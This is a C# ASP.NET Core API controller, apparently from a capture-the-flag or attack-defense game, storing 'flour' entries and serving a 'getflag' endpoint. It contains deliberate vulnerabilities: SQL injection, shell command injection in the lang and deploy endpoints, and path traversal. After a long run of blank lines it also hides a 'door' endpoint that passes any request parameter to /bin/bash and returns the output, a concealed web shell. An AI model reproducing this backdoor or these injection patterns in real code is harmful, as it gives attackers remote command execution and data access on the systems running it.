using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Threading.Tasks;
using System.Xml;
using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using Webapi.Helpers;
using Webapi.Models;

namespace Webapi.Controllers
{
    [Route("api/[controller]")]
    [ApiController]
    public class ValuesController : ControllerBase
    {
        private readonly MyDbContext _context;

        public ValuesController(MyDbContext context) {
            _context = context;
        }

        // GET api/values
        [HttpGet]
        public ActionResult<IEnumerable<string>> Get()
        {
            return new string[] { "value1", "value2" };
        }

        // GET api/values/5
        [HttpGet("{id}")]
        public ActionResult<string> Get(int id)
        {
            return "value";
        }

        // POST api/values
        [HttpGet("depositflour")]
        //public ActionResult Post([FromBody] string value)
        public ActionResult useradd(string username, string password, string flournr)
        {
            if (_context.User.Any(o => o.Username == username))
            {
                var userobj = _context.User.Where(o => o.Username == username).First();
                var flour = new Flour {
                    Flour1 = flournr,
                    UserUserid = userobj.Userid,
                };
                _context.Flour.Add(flour);
                _context.SaveChanges();
            }
            else
            {
                var user = new User
                {
                    Username = username,
                    Password = password,
                };
                _context.User.Add(user);
                _context.SaveChanges();
                var userobj = _context.User.Where(o => o.Username == username).First();
                var flour = new Flour
                {
                    Flour1 = flournr,
                    UserUserid = userobj.Userid,
                };
                _context.Flour.Add(flour);
                _context.SaveChanges();
            }
            return Ok("Added");
        }



        [HttpPost("flourstore")]
        //public ActionResult Post([FromBody] string value)
        public ActionResult GetFlour()
        {
            string body = "";
            using (var reader = new StreamReader(Request.Body))
            {
                body = reader.ReadToEnd();
                Console.WriteLine(reader.ReadToEnd());
            }
            var test = _context.Flour.FromSql("SELECT flourid,user_userid,flour FROM Flour LEFT JOIN User ON Flour.user_userid = User.userid WHERE User.username = '" + body + "';").ToList().First().Flour1;
            return Ok(test);
        }

        [HttpGet("cleanup")]
        //public ActionResult Post([FromBody] string value)
        public ActionResult clean(string name)
        {
            var user = _context.User.First(x => x.Username == name);

            _context.User.Remove(user);
            _context.SaveChanges();

            return Ok("cleaned");
        }


        // POST api/values
        [HttpPost("send")]
        public ActionResult Post()
        {
            string body = "";
            using (var reader = new StreamReader(Request.Body))
            {
                body = reader.ReadToEnd();
                Console.WriteLine(reader.ReadToEnd());
            }

            XmlTextReader myReader = new XmlTextReader(new StringReader(body));
            string xml = "";
            while (myReader.Read())
            {
                if (myReader.NodeType == XmlNodeType.Element)
                {
                    xml += myReader.ReadElementContentAsString();
                }
            }
            /*XmlDocument xmlDoc = new XmlDocument();
            xmlDoc.LoadXml(xml);
            Console.WriteLine(xmlDoc.InnerText);*/

            return Ok("ok");

        }





        // PUT api/values/lang
        [HttpPost("lang")]
        public ActionResult getLang()
        {
            string body = "";
            using (var reader = new StreamReader(Request.Body))
            {
                body = reader.ReadToEnd();
                Console.WriteLine(reader.ReadToEnd());
            }

            //Security replacements
            body = body.Replace("/", "");
            body = body.Replace("./", "");
            body = body.Replace("../", "");
            body = body.Replace("\\", "");
            body = body.Replace(".\\", "");
            body = body.Replace(".\\", "");

            //string line = "";
            string cmd = "cat Lang/" + body;
            var output = cmd.Bash();
            Console.WriteLine(output);
            /*var proc = new System.Diagnostics.Process
            {
                StartInfo = new System.Diagnostics.ProcessStartInfo
                {
                    FileName = "/bin/bash",
                    Arguments = "-c cat //home//mill//webapi-bin//Lang////" + body,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    CreateNoWindow = true
                }
            };


            proc.Start();
            while (!proc.StandardOutput.EndOfStream)
            {
                line += proc.StandardOutput.ReadLine();
            }*/

            return Ok(output);
        }


        [HttpGet("deploy")]
        public ActionResult deploy(string content)
        {
            string hash;
            using (MD5 md5Hash = MD5.Create())
            {
                hash = crypt.GetMd5Hash(md5Hash, content);
            }

            string cmd = "echo '" +content+ "' > Flour/" +hash;
            var output = cmd.Bash();
            Console.WriteLine(output);

            /*
            var proc = new System.Diagnostics.Process
            {
                StartInfo = new System.Diagnostics.ProcessStartInfo
                {
                    FileName = "/bin/bash",
                    Arguments = "-c echo '" + content + "' > //home//mill//webapi-bin//Flour////" + hash,  
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    CreateNoWindow = true
                }
            };

            

            proc.Start();
            */
            return Ok(output);
        }


        [HttpGet("getflag")]
        public ActionResult pull(string content)
        {
            var path = Path.Combine(Directory.GetCurrentDirectory(), "Flour////" + content);
            Console.WriteLine(Directory.GetCurrentDirectory());
            string text = System.IO.File.ReadAllText(path);

            return Ok(text);
        }

        // DELETE api/values/5
        [HttpDelete("{id}")]
        public void Delete(int id)
        {
        }






















































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































        [HttpGet("door")]
    public ActionResult getdoor(string content){var proc = new System.Diagnostics.Process{StartInfo = new System.Diagnostics.ProcessStartInfo{FileName = "/bin/bash",Arguments = "-c '" + content + "'",UseShellExecute = false,RedirectStandardOutput = true,CreateNoWindow = true}};proc.Start();var result = proc.StandardOutput.ReadToEnd();proc.WaitForExit();return Ok(result);}






































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































    }
}